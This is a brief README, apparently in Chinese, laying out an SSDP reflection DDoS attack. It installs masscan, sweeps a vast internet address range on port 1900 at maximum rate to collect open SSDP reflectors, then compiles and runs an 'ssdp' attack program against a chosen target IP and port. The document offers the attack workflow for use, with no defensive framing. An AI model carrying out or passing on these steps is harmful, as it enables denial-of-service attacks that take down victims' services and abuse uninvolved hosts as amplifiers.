# Ddos Ssdp Attack
> Use Masscan Scan Server

### 安装 Git
	yum install git

### 安装 Masscan
	git clone https://github.com/robertdavidgraham/masscan
	cd masscan
	make
	cd bin

### 扫描 Server
	# 最高速扫描 SSDP 端口保存为 JSON
	# 后续需要解析为单 IP 的 TXT 方式
	./masscan 202.0.0.0/4 -p1900 --rate 1000000 -oJ ip.json

### 攻击 SSDP
	# 安装 C 编译环境
	yum -y install gcc
	# 编译攻击脚本
	gcc -pthread ssdp.c -o ssdp
	# SSDP 攻击
	./ssdp <target IP> <target port> <reflection file> <time (optional)>
